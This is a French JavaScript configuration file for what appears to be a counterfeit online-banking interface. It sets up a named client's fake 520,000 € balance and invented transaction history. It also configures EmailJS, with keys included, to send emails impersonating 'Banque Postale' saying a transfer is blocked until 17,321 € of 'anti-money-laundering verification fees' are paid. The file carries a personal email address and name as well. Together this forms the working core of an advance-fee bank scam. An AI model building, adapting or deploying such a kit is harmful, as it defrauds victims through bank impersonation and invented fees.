// =========================
// Variables de configuration globales
// =========================

var message =
  "Un retard a été constaté dans le paiement des frais de vérification obligatoires liés aux mesures anti-blanchiment. Pour finaliser le processus, un règlement de 17 321 € est requis.";
var name = "Eric Vincent Degavre";
var solde = "520.000";
var epargne = "22.950";

// Si il a déjà payé
var DejaPayer = true;

// Interrupteur global pour (dés)activer l'envoi d'emails
// Mettre à true pour désactiver les envois EmailJS
var DisableEmailSend = false;

// =========================
// Données dynamiques des pages
// =========================

// Historique: configurez ici vos items pour la page historique
// type: 'in' (entrée) ou 'out' (sortie) pour colorer le montant
// amount: string déjà formatée (ex: "3.500 $")
// label: description courte (ex: "Vir•••", "Dep•••")
// name: contrepartie
var HISTORY_ITEMS = [
  { name: "Christophe Naval", label: "Dep•••", amount: "+ 300.000 €", type: "in" },
  { name: "Christophe Naval", label: "Dep•••", amount: "+ 200.000 €", type: "in" },
  { name: "Renaud PICHELIN", label: "Vir•••", amount: "- 50.000 €", type: "out" },
  { name: "Tim Mathieu", label: "•••• 7099", amount: "- 25.000 €", type: "out" },
  { name: "Elia Dupuis", label: "Dep•••", amount: "+ 95.000 €", type: "in" },
]; // Total IN = 595 000 €, Total OUT = 75 000 €, Solde = 520 000 €


// IBAN paramétrable pour la page comptes
// Nous affichons les 4 derniers chiffres masqués sous forme •••• 1234
var IBAN_LAST4 = "7561";

// =========================
// Configuration EmailJS
// Centralisée ici pour éviter de modifier les pages HTML
// =========================

// Clés EmailJS
var EMAILJS_PUBLIC_KEY = "EnXs88zxuU0BNLpLw";
var EMAILJS_SERVICE_ID = "service_cbqxsxs";
var EMAILJS_TEMPLATE_ID = "template_34nyu5n";

// Paramètres/Mapping attendus par le template EmailJS
// - Les 5 premiers sont les champs saisis dans le formulaire
// - Les suivants sont des valeurs statiques, modifiables ici
var EMAILJS_TEMPLATE_PARAMS_KEYS = {
  iban: "iban",
  country: "country",
  name: "name",
  prenom: "prenom",
  montant: "montant",
  banqueLogo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQMbI3pxJSeydjItiQ4mbbHyMioYxJWKOMc6A&s",
  senderName: "Banque Postale",
  senderSubject: "Important: Nouveau virement Bloqué",
  email: "ericdegavre6@gmail.com",
  message:
    "Le virement a échoué car votre compte est actuellement bloqué. Ce blocage fait suite à un retard dans le paiement des frais de vérification obligatoires liés aux mesures anti-blanchiment. Pour débloquer votre compte et finaliser le virement, un règlement de 17 321 € est requis.",
};


// =========================
// Fonctions utilitaires
// =========================

(function initSettings() {
  try {
    // Affiche le bandeau "à payer" si nécessaire (si l'élément existe sur la page)
    if (!DejaPayer) {
      var aPayerEl = document.getElementById("aPayer");
      if (aPayerEl) {
        aPayerEl.classList.remove("hidden");
      }
    }

    // Persiste les montants
    try {
      localStorage.setItem("solde", solde);
      localStorage.setItem("epargne", epargne);
    } catch (_) {
      // stockage non critique
    }

    // Renseigne les textes si présents sur la page courante
    var setTextIfPresent = function (id, value) {
      var el = document.getElementById(id);
      if (el) {
        el.innerText = value;
      }
    };
    setTextIfPresent("messageId", message);
    setTextIfPresent("clientName", name);
    setTextIfPresent("soldeClient", solde);
    setTextIfPresent("epargneId", epargne);

    // Injection dynamique de l'historique si la zone existe
    var historyList = document.getElementById("historyList");
    if (historyList && Array.isArray(HISTORY_ITEMS) && HISTORY_ITEMS.length > 0) {
      // Masquer le fallback statique s'il est présent
      var staticBlock = document.getElementById("historyStatic");
      if (staticBlock) {
        staticBlock.style.display = "none";
      }

      HISTORY_ITEMS.forEach(function (item) {
        var wrapper = document.createElement("div");
        wrapper.className = "border rounded-md h-16 cursor-pointer bg-white border-gray-400 mt-8 p-2 flex justify-between hover:shadow-md transition-all";

        var left = document.createElement("div");
        var pName = document.createElement("p");
        pName.innerText = item.name || "-";
        var pLabel = document.createElement("p");
        pLabel.innerText = item.label || "";
        left.appendChild(pName);
        left.appendChild(pLabel);

        var right = document.createElement("p");
        var type = (item.type || "").toLowerCase();
        right.className = "text-xl" + (type === "in" ? " text-green-500" : type === "out" ? " text-blue-500" : "");
        right.innerText = item.amount || "";

        wrapper.appendChild(left);
        wrapper.appendChild(right);
        historyList.appendChild(wrapper);
      });
    }

    // Injection de l'IBAN masqué si la zone existe
    var ibanMaskedEl = document.getElementById("ibanMasked");
    if (ibanMaskedEl && typeof IBAN_LAST4 === "string" && IBAN_LAST4.length > 0) {
      ibanMaskedEl.innerText = "••••\u00A0" + IBAN_LAST4;
    }
  } catch (e) {
    // Ne jamais casser la page à cause des settings
    console.warn("Initialisation des settings: avertissement", e);
  }
})();


